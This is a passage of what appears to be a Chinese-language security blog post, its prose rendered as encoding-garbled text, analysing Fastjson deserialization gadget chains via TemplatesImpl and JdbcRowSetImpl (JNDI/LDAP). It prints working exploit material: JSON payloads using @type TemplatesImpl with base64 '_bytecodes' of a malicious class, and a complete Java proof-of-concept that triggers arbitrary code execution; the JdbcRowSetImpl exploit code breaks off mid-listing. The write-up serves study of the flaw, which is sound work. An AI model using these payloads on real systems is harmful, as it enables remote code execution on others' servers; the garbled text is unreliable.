&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ÂÖ∂ÂÆÉÁöÑÂíå‰πãÂâçÊ≤°Âï•Â∑ÆÂà´ÔºåjdkÁî®8u65Â∞±Ë°åÔºåÂõ†‰∏∫‰ºöÊúâjndiÁõ∏ÂÖ≥ÁöÑ‰∏Ä‰∫õ‰∏úË•ø</p><h2 id="Âü∫‰∫é-TemplatesImpl-ÁöÑÂà©Áî®Èìæ"><a href="#Âü∫‰∫é-TemplatesImpl-ÁöÑÂà©Áî®Èìæ" class="headerlink" title="Âü∫‰∫é TemplatesImpl ÁöÑÂà©Áî®Èìæ"></a>Âü∫‰∫é TemplatesImpl ÁöÑÂà©Áî®Èìæ</h2><p>ËøôÊù°ÈìæÂ≠êÁΩë‰∏äÁöÑÊñáÁ´†ÂàÜÊûêÁöÑÂæàÂ§öÔºå‰ΩÜÊòØÁî®ÁöÑÂç¥ÊòØÊúÄÂ∞ëÁöÑÔºåfastjson‰∏≠Â∞±ÊòØÊâæÂì™‰∏™Á±ª‰∏ãÁöÑgetterÂíåsetterÊúâÈóÆÈ¢òÔºåËÄåËøôÊù°Èìæ‰º†ÂÖ•‰∫Ü‰∏ÄÂ†ÜÊ†πÊú¨Ê≤°ÊúâgetterÂíåsetterÁöÑÂèòÈáèÔºåÊâÄ‰ª•Â∞±ÂæóÂºÄÂêØ<code>Feature.SupportNonPublicField</code>Ëøô‰∏™Â±ûÊÄßÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊâçËÉΩËß£ÊûêÈÇ£‰∫õÊ≤°ÊúâgetterÂíåsetterÊñπÊ≥ïÁöÑÂ±ûÊÄßÔºåËøôÊ†∑Â∞±ÂØºËá¥‰∫ÜËøôÊù°ÈìæÂÆûÁî®‰ª∑ÂÄºÂπ∂‰∏çÈ´ò</p><h3 id="1-ÈìæÂ≠êÂàÜÊûê"><a href="#1-ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="1.ÈìæÂ≠êÂàÜÊûê"></a>1.ÈìæÂ≠êÂàÜÊûê</h3><h4 id="ÈÄâÂèñËÉΩÂ§üÂëΩ‰ª§ÊâßË°åÁöÑÁ±ª"><a href="#ÈÄâÂèñËÉΩÂ§üÂëΩ‰ª§ÊâßË°åÁöÑÁ±ª" class="headerlink" title="ÈÄâÂèñËÉΩÂ§üÂëΩ‰ª§ÊâßË°åÁöÑÁ±ª"></a>ÈÄâÂèñËÉΩÂ§üÂëΩ‰ª§ÊâßË°åÁöÑÁ±ª</h4><p>ËøôÈáåÁõ¥Êé•ÂéªÂà∞ÂèëÁé∞ÊºèÊ¥ûÁöÑÁ±ªÔºåÂú®TemplatesImplÁ±ªÔºåËøô‰∏™Á±ª‰πüÊòØCC3‰∏≠Âà©Áî®ÁöÑÂä†ËΩΩÂ≠óËäÇÁ†ÅÁöÑÁ±ªÂç≥Ë∞ÉÁî®<code>newInstance()</code> ÊñπÊ≥ïËß¶ÂèëÊºèÊ¥ûÔºåÂú®fastjson‰∏≠ÂÆÉÁöÑ‰∏Ä‰∏™getterÊñπÊ≥ïÈáåÈù¢‰πüË∞ÉÁî®‰∫ÜÂç≥<code>getTransletInstance()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125997.png" alt="image-20230821212512323"><br>ÈÇ£ËøôÈáåÂèØËÉΩÂ∞±‰ºöÂá∫ÈóÆÈ¢òÔºåÂÆûÈôÖ‰∏ä‰πüÁ°ÆÂÆûÊúâÈóÆÈ¢ò</p><h4 id="TemplatesImplË∞ÉÁî®Êù°‰ª∂ÂàÜÊûê"><a href="#TemplatesImplË∞ÉÁî®Êù°‰ª∂ÂàÜÊûê" class="headerlink" title="TemplatesImplË∞ÉÁî®Êù°‰ª∂ÂàÜÊûê"></a>TemplatesImplË∞ÉÁî®Êù°‰ª∂ÂàÜÊûê</h4><p>Êú¨Êù•ÊÉ≥ÂÖàË∞ÉËØï‰∏Ä‰∏ãÂÜçÊù•ÁúãÁöÑÔºåÂ•à‰ΩïÊäÄÊúØÂ§™Â∑Æ‰∏ç‰ºöË∞ÉÔºåÂ∞±Ë∑üÁùÄDrunkbaby‰Ω¨ÂÖàÁúã‰∏Ä‰∏ã <code>getTransletInstance()</code> ÊñπÊ≥ïÔºåËøôÈáåÂÖ∂ÂÆûÂ∞±ÂíåCC3Â∑Æ‰∏çÂ§öÁöÑ‰∫ÜÔºåÊàë‰ª¨ÈúÄË¶ÅËøõÂÖ•<code>defineTransletClasses()</code>ÊñπÊ≥ïÈáåÈù¢ÔºåÈÇ£‰πàËøôÈáåË¶ÅÊª°Ë∂≥ÁöÑÊù°‰ª∂Â∞±ÂíåCC3‰∏ÄÊ†∑ÁöÑ‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125759.png" alt="image-20230821212545549"><br><code>_name</code>‰∏çËÉΩ‰∏∫Á©∫Ôºå<code>_class</code>Ë¶Å‰∏∫Á©∫ÊâçËÉΩËøõÂÖ•Âà∞<code>defineTransletClasses()</code>ÊñπÊ≥ïÊâÄ‰ª•‰∏çËµãÂÄºÊàñËÄÖËµãÂÄº‰∏∫nullÈÉΩË°åÔºåÊé•ÁùÄÊù•Âà∞<code>defineTransletClasses()</code>ÊñπÊ≥ïÔºå<code>_bytecodes</code>‰∏çËÉΩ‰∏∫Á©∫Âê¶ÂàôÊäõÂºÇÂ∏∏ÔºåÊé•ÁùÄÂ∞±ÊòØ<code>_tfactory</code>‰∏çËÉΩ‰∏∫Á©∫ÔºåÂõ†‰∏∫ËøôÈáå‰ºöË∞ÉÁî®Âà∞<code>getExternalExtensionsMap()</code>ÊñπÊ≥ï‰∏∫Á©∫ÁöÑËØù‰Ω†Êó†Ê≥ïË∞ÉÁî®Âπ∂‰∏î‰ºöÊä•ÈîôÔºåËøôÈáåÁúã‰∏Ä‰∏ãËøô‰∏™ÂèòÈáèÂèëÁé∞ÊòØ<code>transient</code>Êù•‰øÆÈ•∞ÁöÑÔºåÊÑèÂë≥ÁùÄÂèçÂ∫èÂàóÂåñÊó†Ê≥ïÂèñÂà∞ÂÆÉÁöÑÂÄº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126940.png" alt="image-20230821212603849"><br>‰∏çËøáÂÆÉ‰∏ÄÂºÄÂßãÂ∞±ËøõË°å‰∫ÜÂÆû‰æãÂåñÊ≠£Â•Ω‰∏∫<code>TransformerFactoryImpl</code>Á±ªÁöÑÂÆû‰æãÔºåÊâÄ‰ª•Â∞±‰∏çÈúÄË¶ÅÂ§ÑÁêÜÔºå‰ΩÜÊòØÂú®ËøôÈáåÂ∞±Êúâ‰∏™ÁñëÈóÆ‰∫ÜÔºåËøô‰πüÊòØÂâçÂá†Â§©JasperÂ∏àÂÇÖÈóÆÊàëÁöÑ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÊàëÂú®ÂàÜÊûêCC3ÁöÑÊó∂ÂÄôÈÉΩÊ≤°Ê≥®ÊÑèÂà∞Ëøô‰∏™ÈóÆÈ¢òÔºåÊó¢ÁÑ∂ÂÆÉÊòØÁî±<code>transient</code>Êù•‰øÆÈ•∞ÂèçÂ∫èÂàóÂåñÊó†Ê≥ïËé∑ÂèñÂà∞ÂÆÉÁöÑÂÄºÔºåÂÖ®Èù†ÂÆÉËá™Â∑±ÁöÑÂàùÂßãÂåñÔºåÈÇ£‰πàexp‰∏≠‰∏∫‰ªÄ‰πàÂèàË¶ÅÁªôÂÆÉÂ§ÑÁêÜ‰∏Ä‰∏ãÂë¢ÔºüÊàëËÆ∞ÂæóÂú®CC3‰∏≠ÊòØÈÄöËøáÂèçÂ∞ÑÁªôÂÆÉÂÆû‰æãÂåñ‰∫Ü‰∏Ä‰∏ãÔºåÂ∏¶ÁùÄËøô‰∏™ÈóÆÈ¢òÁªßÁª≠ÂæÄ‰∏ãÔºåÁúãÁúãÂæÖ‰ºöËÉΩ‰∏çËÉΩÊêûÊáÇÔºåÁõÆÂâçÂ§ßÊ¶ÇÁöÑpayloadÂ∞±Â¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaÂèçÂ∫èÂàóÂåñ\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØÁªèËøáÂ∞ùËØïËøòÊòØ‰∏çË°åÁöÑÔºåÊâÄ‰ª•ÁªßÁª≠ÂàÜÊûêÔºåËøôÈáåÂÜçÁúã‰∏Ä‰∏ãFastjson‰ºöÂØπsetter&#x2F;getterÊñπÊ≥ïËøõË°åË∞ÉÁî®ÁöÑË¶ÅÊ±Ç<br>Êª°Ë∂≥Êù°‰ª∂ÁöÑsetterÔºö</p><ul><li>ÈùûÈùôÊÄÅÂáΩÊï∞</li><li>ËøîÂõûÁ±ªÂûã‰∏∫voidÊàñÂΩìÂâçÁ±ª</li><li>ÂèÇÊï∞‰∏™Êï∞‰∏∫1‰∏™</li></ul><p>Êª°Ë∂≥Êù°‰ª∂ÁöÑgetterÔºö</p><ul><li>ÈùûÈùôÊÄÅÊñπÊ≥ï</li><li>Êó†ÂèÇÊï∞</li><li><strong>ËøîÂõûÂÄºÁ±ªÂûãÁªßÊâøËá™CollectionÊàñMapÊàñAtomicBooleanÊàñAtomicIntegerÊàñAtomicLong</strong></li></ul><p>ËÄå<code>getTransletInstance()</code> Ëøô‰∏™ÊñπÊ≥ï‰∏çÊª°Ë∂≥‰∏äËø∞ÁöÑËøîÂõûÂÄºÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126152.png" alt="image-20230821212632069"><br>ÂÆÉËé∑Âèñ‰∫ÜÂÆûÁé∞TransletÊé•Âè£Á±ªÁöÑÂÆû‰æãÔºåÊâÄ‰ª•ÂÆÉËøîÂõûÁöÑÊòØ‰∏Ä‰∏™ÊäΩË±°Á±ªÔºå‰∏çÊª°Ë∂≥‰∏äËø∞ÁöÑËøîÂõûÁ±ªÂûãÔºåfastjsonÊó†Ê≥ïË∞ÉÁî®Âà∞</p><h4 id="Ëß£ÂÜ≥Êó†Ê≥ïË∞ÉÁî®-getTransletInstance-ÊñπÊ≥ïÁöÑÈóÆÈ¢ò"><a href="#Ëß£ÂÜ≥Êó†Ê≥ïË∞ÉÁî®-getTransletInstance-ÊñπÊ≥ïÁöÑÈóÆÈ¢ò" class="headerlink" title="Ëß£ÂÜ≥Êó†Ê≥ïË∞ÉÁî® getTransletInstance() ÊñπÊ≥ïÁöÑÈóÆÈ¢ò"></a>Ëß£ÂÜ≥Êó†Ê≥ïË∞ÉÁî® <code>getTransletInstance()</code> ÊñπÊ≥ïÁöÑÈóÆÈ¢ò</h4><p>ÈÇ£‰πàÂú®ËøôÈáåÂ∞±ÂÉè‰πãÂâçÊâæÈìæÂ≠ê‰∏ÄÊ†∑Ôºåfind usagesÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>getTransletInstance()</code> ÊñπÊ≥ïÔºåÂèëÁé∞Âú®Âêå‰∏Ä‰∏™Á±ª‰∏ãÁöÑ<code>newTransformer()</code>ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212127692.png" alt="image-20230821212713593"><br>‰ΩÜÊòØ<code>newTransformer()</code>‰∏çÊòØsetter&#x2F;getterÊñπÊ≥ïÔºåÊó†Ê≥ïÁõ¥Êé•Ë∞ÉÁî®ÔºåÊâÄ‰ª•ÁªßÁª≠ÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>newTransformer()</code>ÔºåÁÑ∂ÂêéÊâæÂà∞‰∫Ü‰∏Ä‰∏™getterÊñπÊ≥ï‰∏∫<code>getOutputProperties()</code>Âú®Ëøô‰∏™ÊñπÊ≥ïÈáåÈù¢Ë∞ÉÁî®‰∫Ü<code>newTransformer()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212128528.png" alt="image-20230821212745315"><br>ÊâÄ‰ª•ËøôÊó∂ÁöÑÈìæÂ≠êÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p>ËÄå‰∏îËøô‰∏™ <code>getOutputProperties()</code> Êª°Ë∂≥ getter ÊñπÊ≥ïÈáåÈù¢ÁöÑËøîÂõûÂÄºÔºåÂõ†‰∏∫ËøîÂõûÂÄºÊòØ Properties Âç≥ÁªßÊâøËá™ Map Á±ªÂûã„ÄÇ<br>ÊâÄ‰ª•Êàë‰ª¨Áé∞Âú®ÁöÑ payload ÈáåÈù¢ÈúÄË¶ÅÂéªÁÆ° <code>getOutputProperties()</code> ÁöÑ <code>_outputProperties</code> ÂèòÈáèÁöÑÂÄºÔºåÁõ¥Êé•ËµãÂÄº‰∏∫Á©∫ÔºåÂõ†‰∏∫Âú®ÂâçÈù¢ÁöÑË∞ÉÁî®‰∏≠‰ºöÊää <code>_outputProperties</code> Âèò‰∏∫ <code>outputProperties</code> ÔºåÁÑ∂ÂêéË∞ÉÁî®Ëøô‰∏™Â±ûÊÄßÁöÑgetterÊñπÊ≥ïÂç≥<code>getOutputProperties()</code>ËøôÊ†∑Â∞±ËøûËµ∑Êù•‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑ payload Â§ßÊ¶ÇÊòØËøôÊ†∑ÁöÑ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaÂèçÂ∫èÂàóÂåñ\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"> \&quot;_outputProperties\&quot;:&#123; &#125;,</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>ÂÖ∂ÂÆûËøôÊ†∑ÂÜçÊûÑÈÄ†expÂ∞±ËÉΩÂºπÂá∫ËÆ°ÁÆóÂô®‰∫ÜÔºå‰ΩÜÊòØËøôÈáåËøòÊòØÂÖàÂÖ∑‰ΩìÁúã‰∏Ä‰∏ã‰∏∫‰ªÄ‰πàË¶ÅÂä†‰∏ä<code>_outputProperties</code> ÊúÄÁªàÊòØÊâæÂà∞‰∫Ü‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212129248.png"><br>Âú®JavaBeanDeserializerÁ±ª‰∏ãÁöÑ<code>parseField()</code>‰∏≠Ë∞ÉÁî®‰∫Ü<code>smartMatch()</code>ÊñπÊ≥ïÔºåË∑üËøõËøô‰∏™ÊñπÊ≥ïÁúãÁúãÔºåÈÄöËøáËøô‰∏™ÊñπÊ≥ïËé∑ÂèñÂà∞key‰∏∫<code>_outputProperties</code>ÁÑ∂ÂêéÁªèËøá‰∏ÄÁ≥ªÂàóÊìç‰ΩúÂ∞Ü<code>_outputProperties</code>ÊõøÊç¢‰∏∫<code>outputProperties</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212131128.png" alt="image-20230821213147513"><br>ÈÇ£‰πàËé∑ÂèñÂà∞Ëøô‰∏™Â±ûÊÄß‰πãÂêéÂ∞±‰ºöÂéªË∞ÉÁî®Ëøô‰∏™Â±ûÊÄßÁöÑgetterÊñπÊ≥ïÔºåËøôÊ†∑Â∞±Êù•Âà∞‰∫Ü<code>getOutputProperties()</code>ÊñπÊ≥ï‰∏≠ÔºåÊâÄ‰ª•‰∏çË¶ÅËøô‰∏™Â±ûÊÄßÊòØ‰∏çË°åÁöÑÔºåÁÑ∂ÂêéÂ∞±ÊòØ‰πãÂâçÁöÑÈÇ£‰∏™ÈóÆÈ¢òÔºåÂÖ≥‰∫é<code>_tfactory</code>Ëøô‰∏™Â±ûÊÄßÔºåÂú®fastjsonËøôÊù°Èìæ‰∏≠ÔºåËøôÈáåÁõ¥Êé•Â∞ÜÂÆÉËÆæÁΩÆ‰∏∫<code>&#39;_tfactory&#39;:&#123; &#125;</code>Âç≥Ê≤°ÊúâÂÅö‰ªª‰ΩïÂ§ÑÁêÜÔºåËÆ©ÂÆÉËá™Â∑±ÂàùÂßãÂåñÁÑ∂ÂêéÂéªË∞ÉÁî®<code>getExternalExtensionsMap()</code>ÊñπÊ≥ïÔºåÊâÄ‰ª•ËøôÈáåÂíåCC3‰∏≠‰∏çÂ§™‰∏ÄÊ†∑Ëøô‰∏™ÈóÆÈ¢òÂ∞±Âà∞Êó∂ÂÄôÂÜçÂéªÁúãÁúãCC3Âêß</p><h3 id="2-EXP-ÊûÑÈÄ†"><a href="#2-EXP-ÊûÑÈÄ†" class="headerlink" title="2. EXP ÊûÑÈÄ†"></a>2. EXP ÊûÑÈÄ†</h3><p>ËøôÈáåpayloadÂ∞±ÊòØÂâçÈù¢ÁöÑÈÇ£‰∏™ÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÈáåÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÁöÑÂèÇÊï∞ÈúÄË¶ÅÂä†‰∏ä <code>Object.class</code> Âä†‰∏äËøô‰∏™ÂèÇÊï∞Âêé‰ºöËøîÂõûÊàë‰ª¨ÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÔºå‰∏çÁÑ∂Â∞±ËøîÂõûÁöÑÊòØ<code>parseObject</code>ÂΩìÁÑ∂Âà©Áî®<code>parse</code>Êù•ÂèçÂ∫èÂàóÂåñÂ∞±‰∏çÈúÄË¶ÅÔºåÁÑ∂ÂêéËøòÈúÄË¶ÅÂä†‰∏ä<code>Feature.SupportNonPublicField</code>Ëøô‰∏™Âú®ÂâçÈù¢Â∑≤ÁªèÊèêËøá‰∫Ü</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPoc</span> &#123;  </span><br><span class="line">    <span class="comment">//readClassÁî®‰∫éÂ∞ÜÊÅ∂ÊÑèÁ±ªÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆËøõË°åbase64ÁºñÁ†ÅÔºåÂõ†‰∏∫bytesValue()‰ºöÂØπ_bytecodesÁöÑÂÜÖÂÆπËøõË°åBase64Ëß£Á†Å  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaÂèçÂ∫èÂàóÂåñ\\test.class&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +  </span><br><span class="line">                    <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;y0n3er&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;  </span><br><span class="line">            System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(text1, Feature.SupportNonPublicField);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212132383.png" alt="image-20230821213209083"></p><h2 id="JdbcRowSetImpl-Âà©Áî®Èìæ"><a href="#JdbcRowSetImpl-Âà©Áî®Èìæ" class="headerlink" title="JdbcRowSetImpl Âà©Áî®Èìæ"></a>JdbcRowSetImpl Âà©Áî®Èìæ</h2><p>ËøôÊù°ÈìæÂ≠êÂ∞±ÊòØÂπ≥Êó∂Áî®ÁöÑÂ§öÁöÑ‰∏ÄÊù°ÔºåÂà©Áî®ÁöÑÊòØjndiÊ≥®ÂÖ•</p><h3 id="1-JNDI-LDAP"><a href="#1-JNDI-LDAP" class="headerlink" title="1.JNDI + LDAP"></a>1.JNDI + LDAP</h3><p>Áõ¥Êé•ÂàÜÊûê‰∏Ä‰∏ãÊµÅÁ®ãÂêßÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÂ§çÁé∞Â§±Ë¥•‰∫Ü„ÄÇ„ÄÇ„ÄÇ<br>ËøôÈáåÁõ¥Êé•Êù•Âà∞<code>JdbcRowSetImpl</code>Ëøô‰∏™Á±ª‰∏ãÔºåÂú®<code>connect()</code>ÊñπÊ≥ï‰∏ãÂèØ‰ª•ÁúãÂà∞ÊòéÊòæÁöÑjndiÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133674.png" alt="image-20230821213335448"><br>Áé∞Âú®ÂØªÊâæÂì™ÈáåË∞ÉÁî®‰∫Ü<code>connect()</code>ÔºåÊúÄÁªàÊòØÊâæÂà∞‰∫Ü‰∏§‰∏™Ôºå‰ΩÜÊòØ<code>getDatabaseMetaData()</code>ËøîÂõûÁ±ªÂûã‰∏çÁ¨¶ÂêàgetterË∞ÉÁî®Êù°‰ª∂ÔºåÊâÄ‰ª•Â∞±ÊâæÂà∞‰∫Ü<code>setAutoCommit()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133893.png" alt="image-20230821213346258"><br>ËøôÈáåÊàëfind uasgesÊòØËÉΩÊâæÂà∞Ë∞ÉÁî®‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÂè≥Ëæπ‰∏çÊòæÁ§∫Â¶Ç‰∏äÂõæÔºåÂπ∂‰∏î‰∏çËÉΩÁõ¥Êé•Ë∑≥ËΩ¨Âà∞Ê∫êÁ†ÅÔºå‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÂõ†‰∏∫ÊòØclassÊñá‰ª∂ÁöÑÂéüÂõ†ÔºåÂà∞ËøôÈáåÂ∞±ÁÆóÁªìÊùü‰∫ÜÔºåexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span 